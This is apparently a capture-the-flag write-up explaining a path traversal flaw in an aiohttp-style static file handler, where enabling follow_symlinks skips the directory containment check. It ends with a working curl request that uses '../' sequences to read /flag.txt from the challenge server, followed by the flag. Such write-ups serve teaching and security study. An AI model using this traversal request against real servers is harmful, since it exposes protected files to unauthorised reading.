There is a path traversal vulnerability in the static resource handler as hinted by the comment in `app.py`.

```py
    async def _handle(self, request: Request) -> StreamResponse:
        rel_url = request.match_info["filename"]
        try:
            filename = Path(rel_url)
            if filename.anchor:
                # rel_url is an absolute name like
                # /static/\\machine_name\c$ or /static/D:\path
                # where the static dir is totally different
                raise HTTPForbidden()
            filepath = self._directory.joinpath(filename).resolve()
            if not self._follow_symlinks: # [1]
                filepath.relative_to(self._directory)
        except (ValueError, FileNotFoundError) as error:
            # relatively safe
            raise HTTPNotFound() from error
        except HTTPForbidden:
            raise
        except Exception as error:
            # perm error or other kind!
            request.app.logger.exception(error)
            raise HTTPNotFound() from error

        # on opening a dir, load its contents if allowed
        if filepath.is_dir():
            if self._show_index:
                try:
                    return Response(
                        text=self._directory_as_html(filepath), content_type="text/html"
                    )
                except PermissionError:
                    raise HTTPForbidden()
            else:
                raise HTTPForbidden()
        elif filepath.is_file():
            return FileResponse(filepath, chunk_size=self._chunk_size)
        else:
            raise HTTPNotFound
```

Indicated at `[1]`, when the `follow_symlinks` argument is set to `True`, the check to ensure the requested file resource is in the static resource directory is skipped.

The Dockerfile shows that the flag is at `/flag.txt` on the server. The following request reads the `flag.txt` file:

```sh
curl --path-as-is http://localhost:1337/files/../../../../../../flag.txt
DUCTF{../../../p4th/tr4v3rsal/as/a/s3rv1c3}
```
